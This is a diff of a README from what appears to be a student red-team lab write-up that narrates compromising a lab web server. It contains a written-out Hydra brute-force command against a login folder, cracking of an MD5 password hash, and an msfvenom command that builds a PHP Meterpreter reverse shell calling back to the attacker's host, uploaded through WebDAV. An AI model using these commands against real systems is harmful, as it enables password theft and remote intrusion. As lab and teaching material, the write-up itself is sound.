@@ -34,10 +34,32 @@ In the above image, port 22 and port 80 are exposed.
 ![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/775e4bddce20634c247b0dc21a4d30fefb18d59e/Images/Screenshot%202021-11-06%20113801.png)
 ![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/775e4bddce20634c247b0dc21a4d30fefb18d59e/Images/Screenshot%202021-11-06%20114329.png)
 
-After navigating to the secrect folder directory by typing http://192.168.1.105/company_folders/secret_folder/, there was a road block. Credentials were needed. A login screen pops up and states "For Ashton's eyes only". More research into the "meet_our_team" directory was done to find out more information on Ashton.
+3. After navigating to the secrect folder directory by typing http://192.168.1.105/company_folders/secret_folder/, there was a road block. Credentials were needed. A login screen pops up and states "For Ashton's eyes only". More research into the "meet_our_team" directory was done to find out more information on Ashton.
 
 Unfortunately, no further information was found on Ashton and brute forcing would have to be the next option. Hydra was used to retrieve Ashton's password using the command:
 
-_hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder -t 40_
+**_hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder -t 40_**
 
 ![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/f7fe5da82c489111f87e4dde35b77319200cfc02/Images/hydra%20scan.jpg)
+
+4. Logging into the "secret folder" was successful! Once logged in, a lone file called "connect_to_corp_server" was discovered. Inside the file was a set of intructions on how to connect to the company's WebDAV server, along with a user named Ryan and a password MD5 hash. With the help of crackstation.net, Ryan's password was cracked.
+
+![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/e2c36d9e7eb7beaefd8b154e2cc1eee4164c58de/Images/Screenshot%202021-11-06%20124857.png)
+![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/e2c36d9e7eb7beaefd8b154e2cc1eee4164c58de/Images/Screenshot%202021-11-06%20125023.png)
+![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/e2c36d9e7eb7beaefd8b154e2cc1eee4164c58de/Images/Screenshot%202021-11-06%20125348.png)
+
+5. The directions in the "connect_to_corp_server" file were followed in order to gain access to the WebDAV server with Ryan's credentials. The WebDAV had unrestricted upload permissions. A payload using MSFVenom was created in order to create a PHP reverse shell using the command:
+
+**_msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw -o shell.php_**
+
+It was then uploaded into the WebDAV directory.
+
+![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/e2c36d9e7eb7beaefd8b154e2cc1eee4164c58de/Images/Screenshot%202021-11-06%20140046.png)
+![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/f5f5c6f20dd6630abaa687035b0e25f682133603/Images/Screenshot%202021-11-06%20141644.png)
+![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/f5f5c6f20dd6630abaa687035b0e25f682133603/Images/Screenshot%202021-11-09%20192302.png)
+
+6. A listener in Metasploit was deployed. Soon after the playload was lauched, and lastly a Meterpreter session was accessed.
+
+![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/f5f5c6f20dd6630abaa687035b0e25f682133603/Images/Screenshot%202021-11-09%20200616.png)
+![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/f5f5c6f20dd6630abaa687035b0e25f682133603/Images/Screenshot%202021-11-09%20204910.png)
+![name-of-you-image](
